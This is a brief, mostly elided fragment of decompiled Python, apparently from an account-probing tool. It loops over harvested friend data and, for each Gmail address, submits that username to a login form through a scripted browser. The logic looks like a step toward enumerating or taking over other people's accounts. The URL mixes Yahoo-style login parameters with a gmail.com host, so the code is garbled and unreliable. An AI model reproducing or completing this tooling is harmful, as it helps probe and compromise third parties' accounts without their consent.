#Decompiled by MR.RRC7F77_CYBER
...
def gmailfriends():
    ...
    for w in kimak['data']:
        ...
        try:
            ...
            if 'gmail.com' in otw:
                br.open('https://login.gmail.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.gmail.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
